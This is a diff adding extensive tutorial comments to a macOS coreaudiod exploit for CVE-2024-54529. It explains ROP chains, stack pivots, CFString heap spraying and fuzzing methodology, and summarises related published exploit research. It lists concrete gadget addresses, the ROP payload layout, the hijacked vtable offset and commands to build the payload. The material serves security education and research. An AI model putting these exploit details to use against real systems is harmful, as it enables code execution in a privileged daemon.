+ *   ┌─────────────────────────────────────────────────────────────────────┐
+ *   │                     WHY ROP WORKS                                   │
+ *   ├─────────────────────────────────────────────────────────────────────┤
+ *   │                                                                     │
+ *   │   THE PROBLEM:                                                      │
+ *   │   Modern systems have W^X (Write XOR Execute) protection:           │
+ *   │   - Pages are either WRITABLE or EXECUTABLE, never both            │
+ *   │   - Can't write code and then execute it                           │
+ *   │   - Traditional shellcode injection fails                          │
+ *   │                                                                     │
+ *   │   THE SOLUTION:                                                     │
+ *   │   Use code that's ALREADY executable!                               │
+ *   │   - Libraries contain billions of instruction sequences            │
+ *   │   - Find useful sequences ending in RET ("gadgets")                │
+ *   │   - Chain them together via the stack                              │
+ *   │                                                                     │
+ *   │   KEY INSIGHT:                                                      │
+ *   │   RET pops an address from stack into RIP                          │
+ *   │   If we control the stack, we control where RET jumps!             │
+ *   │                                                                     │
+ *   └─────────────────────────────────────────────────────────────────────┘
+ *
+ * GADGET ANATOMY:
+ *
+ *   A gadget is a short instruction sequence ending in RET.
+ *   Examples from libsystem_c.dylib:
+ *
+ *   ┌─────────────────────────────────────────────────────────────────────┐
+ *   │                     COMMON GADGETS                                  │
+ *   ├─────────────────────────────────────────────────────────────────────┤
+ *   │                                                                     │
+ *   │   pop rdi; ret                   ; Load RDI from stack              │
+ *   │   pop rsi; ret                   ; Load RSI from stack              │
+ *   │   pop rdx; ret                   ; Load RDX from stack              │
+ *   │   pop rax; ret                   ; Load RAX from stack              │
+ *   │   xchg rsp, rax; ret             ; STACK PIVOT!                     │
+ *   │   mov rdi, rax; ret              ; Move value between regs          │
+ *   │   syscall                        ; Invoke kernel                    │
+ *   │   add rsp, 0x30; ret             ; Skip stack bytes                 │
+ *   │                                                                     │
+ *   └─────────────────────────────────────────────────────────────────────┘
+ *
+ * ROP CHAIN EXAMPLE (calling open("/path", O_RDWR)):
+ *
+ *   ┌─────────────────────────────────────────────────────────────────────┐
+ *   │                     ROP CHAIN EXECUTION                             │
+ *   ├─────────────────────────────────────────────────────────────────────┤
+ *   │                                                                     │
+ *   │   Stack layout (RSP points here):                                   │
+ *   │                                                                     │
+ *   │   ┌─────────────────────────┐                                      │
+ *   │   │ addr of "pop rdi; ret" │ ──▶ Gadget 1: pop rdi; ret            │
+ *   │   ├─────────────────────────┤       RDI = (address of "/path")      │
+ *   │   │ address of "/path"     │                                        │
+ *   │   ├─────────────────────────┤                                      │
+ *   │   │ addr of "pop rsi; ret" │ ──▶ Gadget 2: pop rsi; ret            │
+ *   │   ├─────────────────────────┤       RSI = O_RDWR (2)                │
+ *   │   │ 0x0000000000000002     │                                        │
+ *   │   ├─────────────────────────┤                                      │
+ *   │   │ addr of "pop rax; ret" │ ──▶ Gadget 3: pop rax; ret            │
+ *   │   ├─────────────────────────┤       RAX = 2 (SYS_open)              │
+ *   │   │ 0x0000000000000002     │                                        │
+ *   │   ├─────────────────────────┤                                      │
+ *   │   │ addr of "syscall"      │ ──▶ syscall executes open()!          │
+ *   │   ├─────────────────────────┤                                      │
+ *   │   │ ... next chain ...     │                                        │
+ *   │   └─────────────────────────┘                                      │
+ *   │                                                                     │
+ *   │   EXECUTION FLOW:                                                   │
+ *   │   1. RET pops "pop rdi; ret" address → jumps there                 │
+ *   │   2. pop rdi loads "/path" address into RDI                        │
+ *   │   3. ret pops "pop rsi; ret" address → jumps there                 │
+ *   │   4. pop rsi loads 2 into RSI                                      │
+ *   │   5. ret pops "pop rax; ret" address → jumps there                 │
+ *   │   6. pop rax loads 2 into RAX                                      │
+ *   │   7. ret pops "syscall" address → executes syscall                 │
+ *   │   8. Kernel executes open("/path", O_RDWR)!                        │
+ *   │                                                                     │
+ *   └─────────────────────────────────────────────────────────────────────┘
+ *
+ * STACK PIVOT:
+ *
+ *   Often the controlled stack area is limited. Stack pivot moves RSP
+ *   to a larger controlled buffer (like heap-sprayed data).
+ *
+ *   ┌─────────────────────────────────────────────────────────────────────┐
+ *   │                     STACK PIVOT                                     │
+ *   ├─────────────────────────────────────────────────────────────────────┤
+ *   │                                                                     │
+ *   │   BEFORE PIVOT:                    AFTER PIVOT:                     │
+ *   │                                                                     │
+ *   │   RSP ──▶ ┌─────────┐             ┌─────────┐                      │
+ *   │           │ limited │             │ limited │                      │
+ *   │           │ control │             │ control │                      │
+ *   │           └─────────┘             └─────────┘                      │
+ *   │                                                                     │
+ *   │   RAX ──▶ ┌─────────────────┐     RSP ──▶ ┌─────────────────┐      │
+ *   │           │ LARGE heap      │             │ LARGE heap      │      │
+ *   │           │ buffer with     │             │ buffer with     │      │
+ *   │           │ ROP chain       │             │ ROP chain       │      │
+ *   │           │ (our payload!)  │             │ NOW EXECUTING!  │      │
+ *   │           └─────────────────┘             └─────────────────┘      │
+ *   │                                                                     │
+ *   │   Gadget: xchg rsp, rax; ret   (swaps RSP and RAX)                 │
+ *   │                                                                     │
+ *   │   In this exploit:                                                  │
+ *   │   - CFString allocations spray the heap with ROP chain             │
+ *   │   - Type confusion gives us control of a pointer at offset 0x68    │
+ *   │   - That pointer leads to the pivot gadget at offset 0x168         │
+ *   │   - Pivot redirects execution to our heap-sprayed ROP chain        │
+ *   │                                                                     │
+ *   └─────────────────────────────────────────────────────────────────────┘
+ *
+ * See build_rop.py in this repository for the actual ROP chain construction.
+ * File: exploit/build_rop.py
+ *
+ * -----------------------------------------------------------------------------
+ * 0.12 HOW BUGS ARE FOUND: DISCOVERY METHODOLOGY
+ * -----------------------------------------------------------------------------
+ *
+ * Bug finding is a systematic process, not magic. Common approaches:
+ *
+ *   ┌─────────────────────────────────────────────────────────────────────┐
+ *   │              BUG DISCOVERY METHODS                                  │
+ *   ├─────────────────────────────────────────────────────────────────────┤
+ *   │                                                                     │
+ *   │   1. CODE REVIEW (Manual Analysis)                                  │
+ *   │      ├── Read source code looking for patterns                     │
+ *   │      ├── "Variant analysis" - find similar bugs                    │
+ *   │      ├── Focus on input parsing, type casts, error handling        │
+ *   │      └── Requires: source access, domain expertise, patience       │
+ *   │                                                                     │
+ *   │   2. STATIC ANALYSIS (Automated Tools)                              │
+ *   │      ├── Compiler warnings (-Wall -Wextra)                         │
+ *   │      ├── CodeQL, Semgrep, Coverity                                 │
+ *   │      ├── Custom queries for specific bug classes                   │
+ *   │      └── Good for known patterns, misses novel bugs                │
+ *   │                                                                     │
+ *   │   3. FUZZING (Dynamic Testing)  ◀══════════════════════════════╗  │
+ *   │      ├── Send random/mutated inputs to find crashes        ║USED║  │
+ *   │      ├── Coverage-guided: maximize code coverage           ║HERE║  │
+ *   │      ├── Grammar-based: understand input structure         ╚════╝  │
+ *   │      └── API fuzzing: chain API calls (like this project!)        │
+ *   │                                                                     │
+ *   │   4. REVERSE ENGINEERING                                            │
+ *   │      ├── Disassemble binaries without source                       │
+ *   │      ├── Understand algorithms and data structures                 │
+ *   │      ├── Tools: IDA Pro, Ghidra, Hopper, radare2                   │
+ *   │      └── Essential for closed-source targets                       │
+ *   │                                                                     │
+ *   │   5. DIFFERENTIAL ANALYSIS                                          │
+ *   │      ├── Compare patched vs unpatched binaries                     │
+ *   │      ├── "1-day" research: understand fixes to find bugs           │
+ *   │      ├── "N-day" research: find unfixed instances                  │
+ *   │      └── Useful when patches are available                         │
+ *   │                                                                     │
+ *   └─────────────────────────────────────────────────────────────────────┘
+ *
+ * CVE-2024-54529 DISCOVERY (API Fuzzing):
+ *
+ *   The Project Zero team used knowledge-driven fuzzing:
+ *
+ *   ┌─────────────────────────────────────────────────────────────────────┐
+ *   │         KNOWLEDGE-DRIVEN API FUZZING                                │
+ *   ├─────────────────────────────────────────────────────────────────────┤
+ *   │                                                                     │
+ *   │   STEP 1: Understand the API                                        │
+ *   │   ─────────────────────────────                                     │
+ *   │   - Reverse engineer message IDs (1010000-1010071)                 │
+ *   │   - Document message structures (headers, body fields)             │
+ *   │   - Map handlers to message IDs                                    │
+ *   │                                                                     │
+ *   │   STEP 2: Build valid message templates                             │
+ *   │   ───────────────────────────────────                               │
+ *   │   - Use valid selector values ('grup', 'agrp', 'mktp', etc.)       │
+ *   │   - Set proper descriptor counts and OOL pointers                  │
+ *   │   - Follow required initialization sequences                       │
+ *   │                                                                     │
+ *   │   STEP 3: Fuzz with API chaining                                    │
+ *   │   ──────────────────────────────                                    │
+ *   │   - Send multiple messages in sequence                             │
+ *   │   - Use returned object IDs in subsequent messages                 │
+ *   │   - Key insight: use object_id from one handler in another!        │
+ *   │                                                                     │
+ *   │   STEP 4: Monitor for crashes                                       │
+ *   │   ────────────────────────────                                      │
+ *   │   - Attach debugger to coreaudiod                                  │
+ *   │   - Log crash locations and backtraces                             │
+ *   │   - Analyze crash for exploitability                               │
+ *   │                                                                     │
+ *   │   THE DISCOVERY:                                                    │
+ *   │   ────────────────                                                  │
+ *   │   Fuzzer created an Engine object (type 'ngne')                    │
+ *   │   Then called XIOContext_Fetch_Workgroup_Port with Engine's ID     │
+ *   │   Handler expected IOContext but got Engine → CRASH!               │
+ *   │                                                                     │
+ *   └─────────────────────────────────────────────────────────────────────┘
+ *
+ * From harness.mm (the fuzzer):
+ *
+ *   File: harness.mm
+ *   Line 103-105: kValidSelectors = {'grup', 'agrp', 'acom', 'mktp', ...}
+ *   Line 126-137: add_selector_information()
+ *     - 95% probability of using VALID selectors (line 131)
+ *     - Ensures messages reach deep handler code
+ *     - Random 5% tests invalid selector handling
+ *
+ * Why 95% valid selectors matters:
+ *
+ *   If selectors were random → most messages rejected early → shallow coverage
+ *   With 95% valid → messages reach complex handler logic → find deeper bugs
+ *
+ * =============================================================================
+ * END OF PART 0.5: FIRST PRINCIPLES
  * =============================================================================
  */
 
@@ -3858,17 +4658,61 @@ int main(int argc, char *argv[]) {
  *
  * USING heap COMMAND:
  *
- *   $ sudo heap audiohald
+ *   $ sudo heap coreaudiod
  *
  *   Shows all heap allocations by class/size.
  *   Look for CFString allocations of ~1168 bytes.
  *
+ *   EXAMPLE OUTPUT (excerpt):
+ *   ─────────────────────────────────────────────────────────────────────────
+ *   Process 188: coreaudiod [pid]
+ *   Path: /usr/sbin/coreaudiod
+ *   Load Address: 0x104e8c000
+ *
+ *   All zones: 115760 nodes malloced - 80.5M (80502784 bytes)
+ *
+ *   Zone DefaultMallocZone_0x104f00000: 91234 nodes - 72.3M (72347648 bytes)
+ *
+ *       COUNT      SIZE       AVG   CLASS_NAME                      TYPE
+ *   =========  =========  ========  ==============================  =====
+ *       15234   17.8M      1168     CFString (mutable-contents)     C
+ *         892    4.2M      4096     CFData                          C
+ *        1023    2.1M      2048     __NSDictionaryM                 ObjC
+ *         456    1.8M      4096     CFArray (mutable-store)         C
+ *   ...
+ *   ─────────────────────────────────────────────────────────────────────────
+ *
+ *   KEY OBSERVATION: The "CFString (mutable-contents)" at 1168 bytes matches
+ *   our spray allocation size! After spraying, this count increases significantly.
+ *
  * USING vmmap:
  *
- *   $ vmmap audiohald
+ *   $ vmmap coreaudiod
  *
  *   Shows virtual memory regions.
  *   Look for MALLOC regions and their sizes.
+ *
+ *   EXAMPLE OUTPUT (excerpt):
+ *   ─────────────────────────────────────────────────────────────────────────
+ *   Process:         coreaudiod [188]
+ *   Path:            /usr/sbin/coreaudiod
+ *   Architecture:    x86_64 (Intel)
+ *
+ *   Virtual Memory Map of process 188 (coreaudiod)
+ *
+ *   ==== Non-writable regions for process 188
+ *   REGION TYPE                 START - END       [ VSIZE]  PRT/MAX SHRMOD
+ *   __TEXT                   104e8c000-104ea0000  [   80K]  r-x/r-x SM=COW
+ *   __DATA_CONST             104ea0000-104eb0000  [   64K]  r--/rw- SM=COW
+ *
+ *   ==== Writable regions for process 188
+ *   MALLOC_TINY             7f8c10000000-7f8c10100000 [    1024K] rw-/rwx SM=PRV
+ *   MALLOC_SMALL            7f8c10100000-7f8c10800000 [       7M] rw-/rwx SM=PRV
+ *   MALLOC_LARGE            7f8c10800000-7f8c11000000 [       8M] rw-/rwx SM=PRV
+ *   ─────────────────────────────────────────────────────────────────────────
+ *
+ *   KEY OBSERVATION: MALLOC_SMALL region is where our CFString allocations
+ *   (1168 bytes each) typically land. After spray, this region grows.
  *
  * USING MallocStackLogging:
  *
@@ -8419,6 +9263,660 @@ int main(int argc, char *argv[]) {
  *   └─────────────────────────────────────────────────────────────────────┘
  *
  * =============================================================================
+ * =============================================================================
+ * PART 13: COMPREHENSIVE REFERENCE APPENDIX - ATOMIC DETAIL
+ * =============================================================================
+ * =============================================================================
+ *
+ * This appendix provides exhaustive references for every technical claim,
+ * including file paths, line numbers, commands to verify, and tools to use.
+ * Designed for both advanced hackers and newcomers learning vulnerability
+ * research from first principles.
+ *
+ * ═══════════════════════════════════════════════════════════════════════════
+ * SECTION A: THIS REPOSITORY'S FILE STRUCTURE
+ * ═══════════════════════════════════════════════════════════════════════════
+ *
+ *   REPOSITORY ROOT: /Users/tal/wudan/dojo/CoreAudioFuzz/
+ *
+ *   File                                    Purpose
+ *   ────────────────────────────────────   ─────────────────────────────────────
+ *   exploit/exploit.mm                     Main exploit (THIS FILE)
+ *   exploit/build_rop.py                   ROP chain generator (Python)
+ *   exploit/rop_payload.bin                Generated ROP payload (1152 bytes)
+ *   exploit/reset-devices.sh               Reset audio device settings
+ *
+ *   harness.mm                             Fuzzing harness (main fuzzer code)
+ *   harness.h                              Harness headers
+ *   helpers/message_ids.h                  MIG message ID definitions (lines 20-83)
+ *   helpers/message.h                      Message ID enum (duplicate)
+ *
+ *   cve-2024-54529-poc-macos-sequoia-15.0.1.c   Original crash PoC
+ *
+ *   references_and_notes/xnu/              XNU kernel source (local copy)
+ *   references_and_notes/xnu/osfmk/ipc/ipc_port.h    struct ipc_port
+ *   references_and_notes/xnu/osfmk/ipc/ipc_kmsg.h    struct ipc_kmsg
+ *
+ *   jackalope-modifications/               Fuzzer engine patches
+ *   get-safari-audit-token/                Helper to get Safari's audit token
+ *
+ *   COMMANDS TO EXPLORE:
+ *   ────────────────────
+ *   $ ls -la /Users/tal/wudan/dojo/CoreAudioFuzz/
+ *   $ ls -la /Users/tal/wudan/dojo/CoreAudioFuzz/exploit/
+ *   $ cat helpers/message_ids.h | head -50
+ *
+ * ═══════════════════════════════════════════════════════════════════════════
+ * SECTION B: build_rop.py - LINE-BY-LINE REFERENCE
+ * ═══════════════════════════════════════════════════════════════════════════
+ *
+ *   FILE: exploit/build_rop.py (56 lines total)
+ *
+ *   GADGET DEFINITIONS (lines 9-27):
+ *   ─────────────────────────────────
+ *   Line 10: STACK_PIVOT_GADGET  = 0x7ff810b908a4  # xchg rsp, rax; ret
+ *   Line 11: POP_RDI_GADGET      = 0x7ff80f185186  # pop rdi; ret
+ *   Line 12: POP_RSI_GADGET      = 0x7ff811fa1e36  # pop rsi; ret
+ *   Line 13: POP_RDX_GADGET      = 0x7ff811cce418  # pop rdx; ret
+ *   Line 14: POP_RAX_GADGET      = 0x7ff811c93b09  # pop rax; ret
+ *   Line 15: ADD_HEX30_RSP       = 0x7ff80f17d035  # add rsp, 0x30; pop rbp; ret
+ *   Line 16: LOAD_RSP_PLUS_EIGHT = 0x7ffd1491ac80  # lea rax, [rsp + 8]; ret
+ *   Line 17: MOV_RAX_TO_RSI      = 0x7ff80f41b060  # mov rsi, rax; pop rbp; ret
+ *   Line 18: MOV_RSI_TO_RDI      = 0x7ff827af146d  # mov rdi, rsi; ret
+ *   Line 27: SYSCALL             = 0x7ff80f1534d0  # syscall
+ *
+ *   INLINE STRING (lines 20-24):
+ *   ─────────────────────────────
+ *   Path: /Library/Preferences/Audio/malicious.txt
+ *   41 bytes including null terminator
+ *   This proves code execution by creating a file in privileged location.
+ *
+ *   CHAIN CONSTRUCTION (lines 30-43):
+ *   ──────────────────────────────────
+ *   Line 30: rop = bytearray(p64(LOAD_RSP_PLUS_EIGHT))  # First gadget
+ *   Line 31: rop += p64(ADD_HEX30_RSP)                   # Skip inline string
+ *   Line 32: rop += INLINE_STRING                        # The filename
+ *   Line 33: rop += b'\x42' * 15                         # Padding
+ *   Line 34: rop += p64(MOV_RAX_TO_RSI)                  # Move string to rsi
+ *   Lines 36-43: Set up syscall arguments and invoke
+ *
+ *   VTABLE ENTRY POINT (line 47):
+ *   ──────────────────────────────
+ *   Line 47: rop[0x168:0x170] = p64(STACK_PIVOT_GADGET)
+ *
+ *   This is CRITICAL: offset 0x168 is where the vulnerable handler reads
+ *   a function pointer. By placing our stack pivot here, we hijack control.
+ *
+ *   HOW TO RUN:
+ *   ───────────
+ *   $ cd /Users/tal/wudan/dojo/CoreAudioFuzz/exploit
+ *   $ python3 build_rop.py
+ *   $ ls -la rop_payload.bin   # Should be 1152 bytes
+ *   $ xxd rop_payload.bin | head -20   # View hex dump
+ *
+ * ═══════════════════════════════════════════════════════════════════════════
+ * SECTION C: PROJECT ZERO COREAUDIO FUZZER DETAILS
+ * ═══════════════════════════════════════════════════════════════════════════
+ *
+ *   FROM: https://projectzero.google/2025/05/breaking-sound-barrier-part-i-fuzzing.html
+ *   REPO: https://github.com/googleprojectzero/p0tools/tree/master/CoreAudioFuzz
+ *
+ *   KEY INSIGHT: API CALL CHAINING
+ *   ───────────────────────────────
+ *   Quote from blog: "each fuzzing iteration would be capable of generating
+ *   multiple Mach messages. This simple but important insight allows a fuzzer
+ *   to explore the interdependency of separate function calls."
+ *
+ *   The fuzzer uses FuzzedDataProvider to consume bytes and construct
+ *   multiple sequential Mach messages within one iteration.
+ *
+ *   COVERAGE IMPROVEMENT: 2000%
+ *   ────────────────────────────
+ *   Quote: "Code coverage increased 2000% following implementation of
+ *   proper message field validation."
+ *
+ *   Key requirements discovered:
+ *   - Message length must be 0x34 (52 bytes) for basic messages
+ *   - Specific options required strict conformance
+ *   - OOL data handling needed proper memory allocation
+ *
+ *   DISCOVERY OF TYPE CONFUSION:
+ *   ─────────────────────────────
+ *   Quote: "The crash occurred at an indirect call instruction where
+ *   the target address derived from a call to the
+ *   HALS_ObjectMap::CopyObjectByObjectID function."
+ *
+ *   The code assumed fetched objects were type 'ioct' (IOContext)
+ *   without validation, enabling attackers to provide different types.
+ *
+ *   TINYINST USAGE:
+ *   ────────────────
+ *   Quote: "I wrote the following TinyInst hook, which checked whether
+ *   the plist object passed into the function was NULL. If so, my hook
+ *   returned the function call early."
+ *
+ *   TinyInst provided:
+ *   1. Symbol resolution for non-exported functions
+ *   2. Function hooking to prevent unrelated crashes
+ *
+ *   JACKALOPE FUZZER COMMAND:
+ *   ──────────────────────────
+ *   From blog:
+ *     $ jackalope -in in/ -out out/ -delivery file -instrument_module CoreAudio
+ *         -target_module harness -target_method _fuzz -nargs 1 -iterations 1000
+ *         -persist -loop -dump_coverage -cmp_coverage -generate_unwind -nthreads 5
+ *         -- ./harness -f @@
+ *
+ * ═══════════════════════════════════════════════════════════════════════════
+ * SECTION D: TINYINST HOOK API REFERENCE
+ * ═══════════════════════════════════════════════════════════════════════════
+ *
+ *   FROM: https://github.com/googleprojectzero/TinyInst/blob/master/hook.md
+ *
+ *   HOOK TYPES:
+ *   ────────────
+ *   HookReplace:  Completely replaces function implementation
+ *                 Original function never runs
+ *
+ *   HookBegin:    Intercepts function entry only
+ *                 Original code still executes
+ *
+ *   HookBeginEnd: Provides both entry and exit instrumentation
+ *                 Breakpoints at entry AND return
+ *
+ *   KEY API FUNCTIONS:
+ *   ───────────────────
+ *   GetArg(n) / SetArg(n, value)     - Access function arguments
+ *   GetRegister(name) / SetRegister(name, value) - Register access
+ *   GetReturnValue() / SetReturnValue(value)
+ *   RemoteRead(addr, size) / RemoteWrite(addr, data, size)
+ *   RemoteAllocate(size) - Allocate in target process
+ *
+ *   USAGE FOR COREAUDIO FUZZING:
+ *   ─────────────────────────────
+ *   1. Create hook class inheriting from Hook
+ *   2. Specify module name (can use "*" for wildcards)
+ *   3. Specify function name or offset
+ *   4. Override OnFunctionEntered / OnFunctionReturned
+ *   5. Register via RegisterHook in constructor
+ *
+ *   EXAMPLE HOOK (from TinyInst documentation):
+ *   ────────────────────────────────────────────
+ *   class MyHook : public HookBeginEnd {
+ *       MyHook() : HookBeginEnd("CoreAudio", "function_name", 2, CALLCONV_DEFAULT) {}
+ *       void OnFunctionEntered() override {
+ *           void* arg0 = GetArg(0);
+ *           if (arg0 == NULL) {
+ *               SetReturnValue(0);
+ *               return;  // Skip function
+ *           }
+ *       }
+ *   };
+ *
+ * ═══════════════════════════════════════════════════════════════════════════
+ * SECTION E: CFString INTERNALS FROM APPLE OPEN SOURCE
+ * ═══════════════════════════════════════════════════════════════════════════
+ *
+ *   FROM: https://github.com/apple-oss-distributions/CF/blob/dc54c6bb1c1e5e0b9486c1d26dd5bef110b20bf3/CFString.c
+ *
+ *   STRUCT __CFSTRING (around line 166):
+ *   ─────────────────────────────────────
+ *   struct __CFString {
+ *       CFRuntimeBase base;           // 16 bytes: isa pointer, flags
+ *       union {
+ *           struct __inline1 {
+ *               CFIndex length;       // Inline string length
+ *           } inline1;
+ *           struct __notInlineImmutable1 {
+ *               void *buffer;         // External buffer pointer
+ *               CFIndex length;       // String length
+ *               CFAllocatorRef contentsDeallocator;
+ *           } notInlineImmutable1;
+ *           struct __notInlineImmutable2 {
+ *               void *buffer;
+ *               CFAllocatorRef contentsDeallocator;
+ *           } notInlineImmutable2;
+ *           struct __notInlineMutable notInlineMutable;
+ *       } variants;
+ *   };
+ *
+ *   WHY THIS MATTERS FOR EXPLOITATION:
+ *   ────────────────────────────────────
+ *   1. Inline storage: Characters stored directly after struct
+ *      - Used for small strings (< 12 chars on 64-bit)
+ *
+ *   2. External storage: Separate heap allocation
+ *      - Used for large strings (our 1152-byte ROP payload)
+ *      - THIS IS THE ALLOCATION WE CONTROL
+ *
+ *   3. CFStringCreateWithBytes() path:
+ *      - Calls __CFStringCreateImmutableFunnel3
+ *      - Converts encoding if needed
+ *      - Decides inline vs external based on size
+ *      - For 1152 bytes: ALWAYS uses external buffer
+ *
+ *   VERIFICATION:
+ *   ──────────────
+ *   $ cd /tmp
+ *   $ git clone https://github.com/apple-oss-distributions/CF
+ *   $ grep -n "struct __CFString" CF/CFString.c
+ *   $ head -200 CF/CFString.c | grep -A30 "__CFString"
+ *
+ * ═══════════════════════════════════════════════════════════════════════════
+ * SECTION F: TASK_T CONSIDERED HARMFUL - KEY TECHNIQUES
+ * ═══════════════════════════════════════════════════════════════════════════
+ *
+ *   FROM: https://projectzero.google/2016/10/taskt-considered-harmful.html
+ *   CVE: CVE-2016-7613
+ *
+ *   CORE INSIGHT:
+ *   ──────────────
+ *   Quote: "every single task_t pointer in the kernel is a potential
+ *   security bug"
+ *
+ *   XNU allows kernel subsystems to operate on raw task struct pointers.
+ *   When a process executes a SUID binary via execve, the kernel modifies
+ *   the existing task struct IN-PLACE rather than creating a new one.
+ *
+ *   THE SUID RACE CONDITION:
+ *   ─────────────────────────
+ *   1. Process A calls a kernel MIG method accepting a task port
+ *   2. That task port is converted to a task struct pointer via
+ *      convert_port_to_task()
+ *   3. The pointer lives on the kernel stack for the MIG call duration
+ *   4. SIMULTANEOUSLY, Process B (target) executes a SUID binary
+ *   5. The old task port is invalidated but the task struct remains
+ *   6. If MIG method modifies task state before exec completes,
+ *      Process A gains unauthorized access to privileged process
+ *
+ *   EXPLOITATION TECHNIQUES:
+ *   ─────────────────────────
+ *   1. IOSurface Attack:
+ *      Create IOKit userclients with dangling task pointers
+ *      Construct IOMemoryDescriptor wrapping arbitrary process memory
+ *
+ *   2. task_set_exception_ports Race:
+ *      Repeatedly call API while target executes SUID binary
+ *      Win race to register exception handlers on privileged task
+ *      Receive task and thread ports when forced exceptions occur
+ *
+ *   RELEVANCE TO CVE-2024-54529:
+ *   ─────────────────────────────
+ *   Same fundamental pattern: kernel/daemon trusts pointers that may
+ *   point to unexpected object types. Type confusion is a generalization
+ *   of this class of bugs.
+ *
+ * ═══════════════════════════════════════════════════════════════════════════
+ * SECTION G: IOS EXPLOIT CHAIN 2 - HEAP EXPLOITATION TECHNIQUES
+ * ═══════════════════════════════════════════════════════════════════════════
+ *
+ *   FROM: https://projectzero.google/2019/08/in-wild-ios-exploit-chain-2.html
+ *   CVE: CVE-2017-13861
+ *
+ *   THE IOSurface VULNERABILITY:
+ *   ─────────────────────────────
+ *   External method 17 (s_set_surface_notify) has a reference counting bug.
+ *   "MIG will drop a second reference on the wake_port" despite only taking
+ *   one initially, creating a use-after-free condition.
+ *
+ *   ZONE ALLOCATOR EXPLOITATION:
+ *   ─────────────────────────────
+ *   1. mach_zone_force_gc() forces reclamation of empty zone chunks
+ *   2. Enables "zone transfer" between allocation zones
+ *      (ipc.ports zone → kalloc.4096 zone)
+ *   3. Creates fake kernel objects by overlaying port names and memory
+ *
+ *   PIPE-BACKED BUFFERS:
+ *   ─────────────────────
+ *   Transitions from immutable message descriptors to mutable pipe buffers.
+ *   Provides persistent memory control for exploitation.
+ *
+ *   KASLR BYPASS (256 possible slides):
+ *   ────────────────────────────────────
+ *   1. Craft a fake IKOT_CLOCK port
+ *   2. Set ip_kobject to guessed clock address
+ *   3. Call clock_sleep_trap()
+ *   4. KERN_FAILURE = wrong guess
+ *   5. Success = correct KASLR slide found
+ *
+ *   ARBITRARY READ VIA pid_for_task:
+ *   ──────────────────────────────────
+ *   Craft fake task port with controlled bsd_info and p_pid field offsets.
+ *   The trap returns the 32-bit value at the target address.
+ *
+ *   RELEVANCE TO COREAUDIO EXPLOIT:
+ *   ─────────────────────────────────
+ *   Same pattern: Use IPC to create controlled kernel allocations,
+ *   free them to create holes, then reclaim with attacker-controlled data.
+ *
+ * ═══════════════════════════════════════════════════════════════════════════
+ * SECTION H: RET2 PWN2OWN 2018 SERIES - JSC EXPLOITATION
+ * ═══════════════════════════════════════════════════════════════════════════
+ *
+ *   FROM: https://blog.ret2.io/2018/07/11/pwn2own-2018-jsc-exploit/
+ *
+ *   THE ADDROF PRIMITIVE:
+ *   ──────────────────────
+ *   Purpose: Retrieve memory address of any JavaScript object
+ *
+ *   Technique:
+ *   1. Create normal JSArray (oob_target) after corrupted array
+ *   2. Corrupted array has out-of-bounds read capability
+ *   3. Place target object in oob_target[0]
+ *   4. Read via relative read: oob_array[oob_target_index]
+ *   5. Result is pointer to object as floating-point value
+ *
+ *   Code pattern:
+ *     oob_target[0] = x;
+ *     return Int64.fromDouble(oob_array[oob_target_index]);
+ *
+ *   THE FAKEOBJ PRIMITIVE:
+ *   ───────────────────────
+ *   Purpose: Convert memory address to JavaScript object reference
+ *
+ *   Technique:
+ *   1. Write address into oob_target butterfly via relative write
+ *   2. Read back as object reference
+ *
+ *   Code pattern:
+ *     oob_array[oob_target_index] = addr.asDouble();
+ *     return oob_target[0];
+ *
+ *   EXPLOITATION CHAIN (6 phases):
+ *   ───────────────────────────────
+ *   1. UAF targeting JSArray butterflies
+ *   2. Relative read/write from corrupted array length
+ *   3. Generic addrof/fakeobj via nearby array manipulation
+ *   4. Arbitrary R/W through faked TypedArray backing store
+ *   5. RWX JIT page location and modification
+ *   6. Arbitrary code execution via shellcode injection
+ *
+ *   STRUCTURE ID SPRAYING:
+ *   ───────────────────────
+ *   Create thousands of TypedArray objects with custom properties.
+ *   Populates runtime's structure map with predictable structureIDs.
+ *   Enables reliable guessing of valid TypedArray structureIDs for faking.
+ *
+ *   RELEVANCE TO COREAUDIO EXPLOIT:
+ *   ─────────────────────────────────
+ *   addrof/fakeobj pattern is analogous to our heap spray:
+ *   - We control what's at a memory location (heap spray)
+ *   - We cause the target to interpret it as a pointer (type confusion)
+ *   - We redirect execution (vtable hijack)
+ *
+ * ═══════════════════════════════════════════════════════════════════════════
+ * SECTION I: RET2 PWN2OWN 2018 SERIES - SANDBOX ESCAPE
+ * ═══════════════════════════════════════════════════════════════════════════
+ *
+ *   FROM: https://blog.ret2.io/2018/07/25/pwn2own-2018-safari-sandbox/
+ *   CVE: CVE-2018-4193
+ *
+ *   SAFARI SANDBOX ARCHITECTURE:
+ *   ─────────────────────────────
+ *   Uses Apple's Seatbelt technology (TinyScheme-based profiles).
+ *
+ *   Key profile files:
+ *   - /System/Library/Sandbox/Profiles/system.sb
+ *   - /System/Library/StagedFrameworks/Safari/WebKit.framework/
+ *     Versions/A/Resources/com.apple.WebProcess.sb
+ *
+ *   The sandbox is a WHITELIST: "deny default" blocks everything
+ *   except explicitly permitted operations.
+ *
+ *   WINDOWSERVER AS ATTACK SURFACE:
+ *   ─────────────────────────────────
+ *   WindowServer runs with root-equivalent permissions.
+ *   Processes ~600 RPC-like functions via Mach messages.
+ *   Has a documented history of vulnerabilities.
+ *
+ *   THE VULNERABILITY (_CGXRegisterForKey):
+ *   ────────────────────────────────────────
+ *   Signed/unsigned integer comparison bypass.
+ *   Code checks "if index > 6" but accepts negative values.
+ *   -2,147,483,643 passes check due to signed comparison.
+ *   Enables out-of-bounds array access.
+ *
+ *   FUZZING METHODOLOGY:
+ *   ─────────────────────
+ *   Used Frida to hook three dispatch points in WindowServer:
+ *   - WindowServer_subsystem (0x1B5CA2, call rax)
+ *   - Rendezvous_subsystem (0x2C58B, call rcx)
+ *   - Services_subsystem (0x1B8103, call rax)
+ *
+ *   "Dumb fuzzing" - random bit flipping on intercepted messages.
+ *
+ *   RELEVANCE TO COREAUDIO EXPLOIT:
+ *   ─────────────────────────────────
+ *   Same pattern: IPC service with many handlers, fuzzing discovers
+ *   type-related bugs, exploitation requires heap manipulation.
+ *
+ * ═══════════════════════════════════════════════════════════════════════════
+ * SECTION J: HARNESS.MM - THE FUZZING HARNESS
+ * ═══════════════════════════════════════════════════════════════════════════
+ *
+ *   FILE: harness.mm (2255 lines)
+ *   LOCATION: /Users/tal/wudan/dojo/CoreAudioFuzz/harness.mm
+ *
+ *   KEY GLOBAL VARIABLES (lines 33-39):
+ *   ────────────────────────────────────
+ *   Line 34: int verbose = 0;
